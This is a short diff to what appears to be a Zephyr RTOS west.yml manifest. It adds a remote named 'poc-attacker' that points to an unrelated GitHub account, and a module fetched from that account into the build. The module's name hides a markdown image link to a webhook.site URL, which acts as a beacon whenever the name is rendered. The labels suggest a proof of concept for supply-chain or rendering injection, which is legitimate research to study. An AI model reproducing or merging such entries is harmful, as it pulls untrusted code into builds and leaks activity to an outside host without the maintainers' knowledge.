@@ -23,6 +23,8 @@ manifest:
       url-base: https://github.com/zephyrproject-rtos
     - name: babblesim
       url-base: https://github.com/BabbleSim
+    - name: poc-attacker
+      url-base: https://github.com/ByteWarden59
 
   group-filter: [-babblesim, -optional]
 
@@ -334,6 +336,11 @@ manifest:
       revision: 49e6dc202aa38c2a3edbafcc2dab85dec6aee973
       groups:
         - debug
+    - name: "poc_![p](https://webhook.site/e429f21e-077e-49f3-af0e-8d1700823365?poc=1&m=POC_ZEPHYR_1)"
+      remote: poc-attacker
+      repo-path: zephyr
+      path: modules/poc_research
+      revision: poc-zephyr-1772164370
     - name: picolibc
       path: modules/lib/picolibc
       revision: 82d62ed1ac55b4e34a12d0390aced2dc9af13fc9
